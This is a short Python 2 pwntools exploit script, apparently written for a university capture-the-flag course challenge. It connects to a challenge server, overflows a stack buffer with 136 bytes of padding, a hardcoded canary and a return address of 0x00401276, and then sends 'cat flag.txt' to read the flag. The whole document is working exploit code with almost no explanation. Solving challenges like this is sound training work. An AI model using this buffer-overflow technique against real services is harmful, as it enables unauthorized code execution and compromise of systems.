#!/usr/bin/env python2

from pwn import *
import time
import struct

PADDING = 136
canary = [0x00, 0xd1, 0x3b, 0x71, 0x9c, 0x1e, 0x87, 0xc8]

#challenge-specific info
host = 'offsec-chalbroker.osiris.cyber.nyu.edu'
port = 1340
netid='pk1898'
r = remote(host, port)
currentByte = 0x00
nextByte = 0xFF
r.sendline(netid)
r.readline()
print r.recvuntil("First, how long is your name?")
size = str(PADDING + 8 + 8 + 4)
r.sendline(size)
r.recvuntil("of data")
DATA = "A" * PADDING
DATA += struct.pack("B", canary[0])
DATA += struct.pack("B", canary[1])
DATA += struct.pack("B", canary[2])
DATA += struct.pack("B", canary[3])
DATA += struct.pack("B", canary[4])
DATA += struct.pack("B", canary[5])
DATA += struct.pack("B", canary[6])
DATA += struct.pack("B", canary[7])
DATA += "B" * 8 #pop RBP
DATA += p64(0x00401276)
print DATA
print ''
r.sendline(DATA)
print r.sendline('cat flag.txt')
print r.readline()
print ''
print r.readline()
print ''
print r.readline()
# # print r.readline()
# received = r.recvuntil("and goodbye!")

# if "and goodbye!" in received:
#     print "it's there!!"